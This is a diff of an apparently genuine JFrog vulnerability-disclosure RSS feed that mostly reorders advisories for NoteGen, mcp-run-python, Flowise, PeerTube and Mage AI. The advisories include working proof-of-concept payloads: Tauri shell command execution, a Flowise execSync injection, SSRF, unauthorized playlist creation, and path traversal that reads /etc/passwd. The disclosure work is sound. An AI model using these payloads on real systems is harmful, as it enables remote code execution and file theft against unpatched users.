@@ -4,7 +4,7 @@
         <title>JFrog Security Vulnerabilities</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest vulnerability disclosures discovered by JFrog Security Research.</description>
-        <lastBuildDate>Thu, 06 Aug 2026 00:35:47 GMT</lastBuildDate>
+        <lastBuildDate>Thu, 06 Aug 2026 06:47:18 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
@@ -87,6 +87,74 @@ https://github.com/MoonshotAI/kimi-code/releases/tag/%40moonshot-ai%2Fkimi-code%
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</guid>
+            <pubDate>Sun, 26 Jul 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-17497, HIGH, NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python
+
+
+## Component
+
+note-gen (NoteGen)
+
+## Affected versions
+
+< 0.32.0
+
+## Description
+
+NoteGen before 0.32.0 grants the Tauri shell plugin shell:allow-execute capability for bash, python, and python3 with arbitrary arguments in the default desktop capabilities. JavaScript running in the application webview can therefore invoke plugin:shell|execute to run attacker-controlled operating system commands with the privileges of the NoteGen process. In combination with script execution in the webview, for example via chat XSS (CVE-2026-17496), this enables full remote code execution on the user's machine.
+
+## PoC
+
+<br>
+
+**Step 1 - Obtain JavaScript execution in the NoteGen webview**
+
+<br>
+
+Use chat XSS (CVE-2026-17496) or another webview script sink so attacker JavaScript runs inside NoteGen < 0.32.0 on a default installation.
+
+<br>
+
+**Step 2 - Invoke the Tauri shell execute API**
+
+<br>
+
+From the webview, call:
+
+```javascript
+window.__TAURI__.core.invoke('plugin:shell|execute', {
+  program: 'bash',
+  args: ['-c', 'open -a Calculator'],
+  options: { cwd: null, env: null, encoding: 'utf-8' }
+});
+```
+
+<br>
+
+**Step 3 - Verify OS command execution**
+
+<br>
+
+Expected result: Calculator opens as the NoteGen user, proving arbitrary OS command execution via bash -c. The same path can read local files and exfiltrate them to an attacker-controlled server.
+
+## Vulnerability Mitigations
+
+Upgrade to NoteGen 0.32.0 or later. The fix removes shell:allow-execute entries that permitted bash, python, and python3 with attacker-controlled arguments from the default Tauri capabilities, closing the webview-to-OS command execution path.
+
+## References
+https://github.com/advisories/GHSA-r5ff-hq22-rhgv
+https://github.com/codexu/note-gen/commit/00064a4a8ec4177d51094ffb3e15bf0758009c1f
+https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[NoteGen is vulnerable to Chat Preview XSS via Unsanitized AI/Skill HTML Rendering]]></title>
             <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-chat-preview-xss-via-unsanitized-ai-skill-html-rendering-cve-2026-17496/</link>
             <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-chat-preview-xss-via-unsanitized-ai-skill-html-rendering-cve-2026-17496/</guid>
@@ -164,74 +232,6 @@ Upgrade to NoteGen 0.32.0 or later. The fix replaces unsanitized markdown-it HTM
 ## References
 https://github.com/advisories/GHSA-gwhc-vprp-gfcg
 https://github.com/codexu/note-gen/commit/ae3ba948c41d8a74b4a20f4c6f26fcdda2002298
-https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</guid>
-            <pubDate>Sun, 26 Jul 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-17497, HIGH, NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python
-
-
-## Component
-
-note-gen (NoteGen)
-
-## Affected versions
-
-< 0.32.0
-
-## Description
-
-NoteGen before 0.32.0 grants the Tauri shell plugin shell:allow-execute capability for bash, python, and python3 with arbitrary arguments in the default desktop capabilities. JavaScript running in the application webview can therefore invoke plugin:shell|execute to run attacker-controlled operating system commands with the privileges of the NoteGen process. In combination with script execution in the webview, for example via chat XSS (CVE-2026-17496), this enables full remote code execution on the user's machine.
-
-## PoC
-
-<br>
-
-**Step 1 - Obtain JavaScript execution in the NoteGen webview**
-
-<br>
-
-Use chat XSS (CVE-2026-17496) or another webview script sink so attacker JavaScript runs inside NoteGen < 0.32.0 on a default installation.
-
-<br>
-
-**Step 2 - Invoke the Tauri shell execute API**
-
-<br>
-
-From the webview, call:
-
-```javascript
-window.__TAURI__.core.invoke('plugin:shell|execute', {
-  program: 'bash',
-  args: ['-c', 'open -a Calculator'],
-  options: { cwd: null, env: null, encoding: 'utf-8' }
-});
-```
-
-<br>
-
-**Step 3 - Verify OS command execution**
-
-<br>
-
-Expected result: Calculator opens as the NoteGen user, proving arbitrary OS command execution via bash -c. The same path can read local files and exfiltrate them to an attacker-controlled server.
-
-## Vulnerability Mitigations
-
-Upgrade to NoteGen 0.32.0 or later. The fix removes shell:allow-execute entries that permitted bash, python, and python3 with attacker-controlled arguments from the default Tauri capabilities, closing the webview-to-OS command execution path.
-
-## References
-https://github.com/advisories/GHSA-r5ff-hq22-rhgv
-https://github.com/codexu/note-gen/commit/00064a4a8ec4177d51094ffb3e15bf0758009c1f
 https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
 ]]></content:encoded>
         </item>
@@ -471,76 +471,6 @@ https://github.com/pollen-robotics/reachy-mini-os/security/advisories/GHSA-7rhg-
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[mcp-run-python Deno SSRF]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</guid>
-            <pubDate>Mon, 09 Feb 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-25904, MEDIUM, Overly permissive Deno configuration in mcp-run-python leads to SSRF]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Overly permissive Deno configuration in mcp-run-python leads to SSRF
-
-## Component
-
-mcp-run-python
-
-## Affected versions
-
-(,)
-
-## Description
-
-The Pydantic-AI MCP Run Python tool configures the Deno sandbox with an overly permissive configuration that allows the underlying Python code to access the localhost interface of the host to perform SSRF attacks. Note - the "mcp-run-python" project is archived and unlikely to receive a fix.
-
-## PoC
-
-1. Configure Claude-Desktop or any other MCP Client to use the Pydantic-AI MCP Run Python tool:
-
-   ```json
-   {
-   "mcpServers": {
-   "mcp-run-python":{
-           "command": "uvx",
-           "args": [
-           "mcp-run-python",
-           "stdio"
-           ]
-       }
-     }
-   }
-   ```
-
-2. Start a HTTP server listening to the localhost interface:
-
-   ```bash
-   python3 -m http.server -b 127.0.0.1 1234
-   ```
-
-3. Ask the MCP client to run this PoC code:
-
-   ```python
-   from pyodide.http import pyfetch
-   response = await pyfetch("http://localhost:1234")
-   data = await response.text()
-   print(data)
-   ```
-
-4. View that the localhost server got a request from the tool
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-
-
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[mcp-run-python lack of isolation MCP takeover]]></title>
             <link>https://research.jfrog.com/vulnerabilities/mcp-run-python-lack-of-isolation-mcp-takeover-jfsa-2026-001653030/</link>
             <guid>https://research.jfrog.com/vulnerabilities/mcp-run-python-lack-of-isolation-mcp-takeover-jfsa-2026-001653030/</guid>
@@ -627,6 +557,76 @@ js.JSON.stringify = js_func
 9. The tool will seem stuck, Note the new notifications/tools/list\_changed notification from the server
 10. Click on `Clear` and then `List Tools`  
 11. Note that the tool name changed from `run_python_code` to `Hijacked Tool`
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+
+
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[mcp-run-python Deno SSRF]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</guid>
+            <pubDate>Mon, 09 Feb 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-25904, MEDIUM, Overly permissive Deno configuration in mcp-run-python leads to SSRF]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Overly permissive Deno configuration in mcp-run-python leads to SSRF
+
+## Component
+
+mcp-run-python
+
+## Affected versions
+
+(,)
+
+## Description
+
+The Pydantic-AI MCP Run Python tool configures the Deno sandbox with an overly permissive configuration that allows the underlying Python code to access the localhost interface of the host to perform SSRF attacks. Note - the "mcp-run-python" project is archived and unlikely to receive a fix.
+
+## PoC
+
+1. Configure Claude-Desktop or any other MCP Client to use the Pydantic-AI MCP Run Python tool:
+
+   ```json
+   {
+   "mcpServers": {
+   "mcp-run-python":{
+           "command": "uvx",
+           "args": [
+           "mcp-run-python",
+           "stdio"
+           ]
+       }
+     }
+   }
+   ```
+
+2. Start a HTTP server listening to the localhost interface:
+
+   ```bash
+   python3 -m http.server -b 127.0.0.1 1234
+   ```
+
+3. Ask the MCP client to run this PoC code:
+
+   ```python
+   from pyodide.http import pyfetch
+   response = await pyfetch("http://localhost:1234")
+   data = await response.text()
+   print(data)
+   ```
+
+4. View that the localhost server got a request from the tool
 
 
 
@@ -1853,60 +1853,6 @@ additional_authorized_imports=[],executor_type='wasm')
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Flowise JS injection remote code execution]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</guid>
-            <pubDate>Thu, 14 Aug 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-55346, CRITICAL, Flowise JS injection remote code execution]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Unintended dynamic code execution leads to remote code execution by network attackers
-
-## Component
-
-[flowise](https://www.npmjs.com/package/flowise?activeTab=code)
-
-## Affected versions
-
-(,)
-
-## Description
-
-User-controlled input flows to an unsafe implementation of a dynamic Function constructor, allowing network attackers to run arbitrary unsandboxed JS code in the context of the host, by sending a simple POST request. Depending on the version of Flowise this could lead to either unauthenticated or authenticated remote code execution.
-
-
-## PoC
-
-Send the following payload to the `node-load-method/customMCP` API endpoint -
-
-```json
-{
-    "inputs":
-    {
-        "mcpServerConfig": "(global.process.mainModule.require('child_process').execSync('touch /tmp/foo'))"
-    },
-    "loadMethod": "listActions"
-}
-```
-
-
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
-
-## References
-
-
-
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[Flowise OS command remote code execution]]></title>
             <link>https://research.jfrog.com/vulnerabilities/flowise-os-command-remote-code-execution-jfsa-2025-001380578/</link>
             <guid>https://research.jfrog.com/vulnerabilities/flowise-os-command-remote-code-execution-jfsa-2025-001380578/</guid>
@@ -1955,6 +1901,60 @@ Send the following payload to the `node-load-method/customMCP` API endpoint -
 ## Vulnerability Mitigations
 
 No mitigations are supplied for this issue
+
+## References
+
+
+
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Flowise JS injection remote code execution]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</guid>
+            <pubDate>Thu, 14 Aug 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-55346, CRITICAL, Flowise JS injection remote code execution]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Unintended dynamic code execution leads to remote code execution by network attackers
+
+## Component
+
+[flowise](https://www.npmjs.com/package/flowise?activeTab=code)
+
+## Affected versions
+
+(,)
+
+## Description
+
+User-controlled input flows to an unsafe implementation of a dynamic Function constructor, allowing network attackers to run arbitrary unsandboxed JS code in the context of the host, by sending a simple POST request. Depending on the version of Flowise this could lead to either unauthenticated or authenticated remote code execution.
+
+
+## PoC
+
+Send the following payload to the `node-load-method/customMCP` API endpoint -
+
+```json
+{
+    "inputs":
+    {
+        "mcpServerConfig": "(global.process.mainModule.require('child_process').execSync('touch /tmp/foo'))"
+    },
+    "loadMethod": "listActions"
+}
+```
+
+
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
 
 ## References
 
@@ -2534,91 +2534,6 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[PeerTube Arbitrary Playlist Creation via REST API]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-rest/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-rest/</guid>
-            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-32945 Medium severity. PeerTube Arbitrary Playlist Creation via REST API]]></description>
-            <content:encoded><![CDATA[## Summary
-This vulnerability allows an existing user to add playlists to a different user’s channel using the REST API.
-
-## Component
-
-[PeerTube](https://github.com/Chocobozzz/PeerTube)
-
-
-
-## Affected versions
-
-(, 7.1.0]
-
-
-
-## Description
-
-The server listens for POST requests to the **/api/v1/video-playlists** path. This path is used for adding a playlist to the PeerTube instance. The **createVideoPlaylist** function receives the request parameters and is in charge of creating the playlist. The following code sets all the parameters of the playlist:
-
-```js
-const videoPlaylist = new VideoPlaylistModel({
-    name: videoPlaylistInfo.displayName,
-    description: videoPlaylistInfo.description,
-    privacy: videoPlaylistInfo.privacy || VideoPlaylistPrivacy.PRIVATE,
-    ownerAccountId: user.Account.id
-}) as MVideoPlaylistFull
-
-videoPlaylist.url = getLocalVideoPlaylistActivityPubUrl(videoPlaylist) // We use the UUID, so set the URL after building the object
-
-if (videoPlaylistInfo.videoChannelId) {
-  const videoChannel = res.locals.videoChannel
-
-  videoPlaylist.videoChannelId = videoChannel.id
-  videoPlaylist.VideoChannel = videoChannel
-}
-
-```
-
-This code sets the owner of the new playlist to be the user who performed the request, and then sets the associated channel to the channel ID supplied by the request, without checking if it belongs to the user. This will allow any user to create a playlist in any existing channel on the server. The playlist will be owned by the attacking user, thus only the attacking user will be able to add and remove videos or change the properties of the playlist, while it will be listed in the web interface as belonging to a different user’s channel.
-
-
-
-## PoC
-
-This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). We also assume that there are 2 existing users on the instance: the default root user and a low privileged user.
-
-
-
-1. First, using a browser, log in to the PeerTube instance with the low privileged user’s credentials, and use the inspection screen to copy the authorization token of the user.
-
-1. Browse to [**http://localhost:3000/api/v1/video-channels**](http://localhost:3000/api/v1/video-channels) and find a video-channel to attack. If there is none, add one to the root user using the web interface. The ID number of the channel will be needed for the next step.
-
-1. Run the following command (insert the user token and channel ID in the proper places):
-
-   ```
-   curl 'http://localhost:3000/api/v1/video-playlists' -H 'Authorization: Bearer user_token' -F "displayName=playlist" -F "videoChannelId=channel_id" -F "privacy=1"
-   ```
-
-   
-
-1. Browse to [**http://localhost:3000/api/v1/video-playlists**](http://localhost:3000/api/v1/video-playlists). The new playlist will be listed there with the attacking user listed as the owner and the attacked channel listed as the playlist’s channel.
-
-1. Using the web interface it will be possible to see the playlist listed in the attacked channel. The attacked user will not see it listed in the “My Library” page, nor will they be able to add or remove videos from it. The attacking user will see it listed under the “My Library” page, and will be able to add or remove videos to it.
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
-
-## References
-
-[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
-
-[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[PeerTube Arbitrary Playlist Creation via ActivityPub Protocol]]></title>
             <link>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-activitypub/</link>
             <guid>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-activitypub/</guid>
@@ -2691,6 +2606,91 @@ This PoC assumes that there is a PeerTube instance on the machine listening on p
    This script will create, sign and send a Create Activity to **http://localhost:9000/inbox**.
 
 1. If everything was configured correctly, a new playlist will be created in **root_channel**, containing one video, and with a picture of a cat as the playlist’s thumbnail.
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
+
+## References
+
+[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
+
+[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[PeerTube Arbitrary Playlist Creation via REST API]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-rest/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-rest/</guid>
+            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-32945 Medium severity. PeerTube Arbitrary Playlist Creation via REST API]]></description>
+            <content:encoded><![CDATA[## Summary
+This vulnerability allows an existing user to add playlists to a different user’s channel using the REST API.
+
+## Component
+
+[PeerTube](https://github.com/Chocobozzz/PeerTube)
+
+
+
+## Affected versions
+
+(, 7.1.0]
+
+
+
+## Description
+
+The server listens for POST requests to the **/api/v1/video-playlists** path. This path is used for adding a playlist to the PeerTube instance. The **createVideoPlaylist** function receives the request parameters and is in charge of creating the playlist. The following code sets all the parameters of the playlist:
+
+```js
+const videoPlaylist = new VideoPlaylistModel({
+    name: videoPlaylistInfo.displayName,
+    description: videoPlaylistInfo.description,
+    privacy: videoPlaylistInfo.privacy || VideoPlaylistPrivacy.PRIVATE,
+    ownerAccountId: user.Account.id
+}) as MVideoPlaylistFull
+
+videoPlaylist.url = getLocalVideoPlaylistActivityPubUrl(videoPlaylist) // We use the UUID, so set the URL after building the object
+
+if (videoPlaylistInfo.videoChannelId) {
+  const videoChannel = res.locals.videoChannel
+
+  videoPlaylist.videoChannelId = videoChannel.id
+  videoPlaylist.VideoChannel = videoChannel
+}
+
+```
+
+This code sets the owner of the new playlist to be the user who performed the request, and then sets the associated channel to the channel ID supplied by the request, without checking if it belongs to the user. This will allow any user to create a playlist in any existing channel on the server. The playlist will be owned by the attacking user, thus only the attacking user will be able to add and remove videos or change the properties of the playlist, while it will be listed in the web interface as belonging to a different user’s channel.
+
+
+
+## PoC
+
+This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). We also assume that there are 2 existing users on the instance: the default root user and a low privileged user.
+
+
+
+1. First, using a browser, log in to the PeerTube instance with the low privileged user’s credentials, and use the inspection screen to copy the authorization token of the user.
+
+1. Browse to [**http://localhost:3000/api/v1/video-channels**](http://localhost:3000/api/v1/video-channels) and find a video-channel to attack. If there is none, add one to the root user using the web interface. The ID number of the channel will be needed for the next step.
+
+1. Run the following command (insert the user token and channel ID in the proper places):
+
+   ```
+   curl 'http://localhost:3000/api/v1/video-playlists' -H 'Authorization: Bearer user_token' -F "displayName=playlist" -F "videoChannelId=channel_id" -F "privacy=1"
+   ```
+
+   
+
+1. Browse to [**http://localhost:3000/api/v1/video-playlists**](http://localhost:3000/api/v1/video-playlists). The new playlist will be listed there with the attacking user listed as the owner and the attacked channel listed as the playlist’s channel.
+
+1. Using the web interface it will be possible to see the playlist listed in the attacked channel. The attacked user will not see it listed in the “My Library” page, nor will they be able to add or remove videos from it. The attacking user will see it listed under the “My Library” page, and will be able to add or remove videos to it.
+
+
 
 ## Vulnerability Mitigations
 
@@ -3185,6 +3185,43 @@ with -
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[Mage AI deleted users RCE]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/mage-ai-deleted-users-rce-jfsa-2024-001039602/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-deleted-users-rce-jfsa-2024-001039602/</guid>
+            <pubDate>Fri, 23 Aug 2024 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2024-45187, HIGH, Mage AI deleted users RCE]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Mage AI allows deleted users to use the terminal server with admin access, leading to remote code execution
+
+## Component
+
+mage-ai
+
+## Affected versions
+
+(,)
+
+## Description
+
+Guest users in the Mage AI framework that remain logged in after their accounts are deleted, are mistakenly given high privileges and specifically given access to remotely execute arbitrary code through the Mage AI terminal server
+
+## PoC
+
+No PoC is supplied for this issue
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+No references are supplied for this issue
+
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[Mage AI file content request remote arbitrary file leak]]></title>
             <link>https://research.jfrog.com/vulnerabilities/mage-ai-file-content-request-remote-arbitrary-file-leak-jfsa-2024-001039603/</link>
             <guid>https://research.jfrog.com/vulnerabilities/mage-ai-file-content-request-remote-arbitrary-file-leak-jfsa-2024-001039603/</guid>
@@ -3256,50 +3293,6 @@ Mage AI allows remote users with the "Viewer" role to leak arbitrary files from 
 ```bash
 curl -X GET
 'http://localhost:6789/api/git_file/..%2F..%2Fetc%2Fpasswd?api_key=<USER API KEY>' -H 'Authorization: Bearer
-<USER TOKEN>'
-```
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-No references are supplied for this issue
-
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Mage AI pipeline interaction request remote arbitrary file leak]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/mage-ai-pipeline-interaction-request-remote-arbitrary-file-leak-jfsa-2024-001039605/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-pipeline-interaction-request-remote-arbitrary-file-leak-jfsa-2024-001039605/</guid>
-            <pubDate>Fri, 23 Aug 2024 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2024-45190, MEDIUM, Mage AI pipeline interaction request remote arbitrary file leak]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Mage AI pipeline interaction request remote arbitrary file leak
-
-## Component
-
-mage-ai
-
-## Affected versions
-
-(,)
-
-## Description
-
-Mage AI allows remote users with the "Viewer" role to leak arbitrary files from the Mage server due to a path traversal in the "Pipeline Interaction" request
-
-## PoC
-
-```bash
-curl -X GET
-'http://localhost:6789/api/pipelines/example_pipeline/interaction/..%2F..%2F..%2
-F..%2Fetc%2Fpasswd?api_key=<USER API KEY>' -H 'Authorization: Bearer
 <USER TOKEN>'
 ```
 
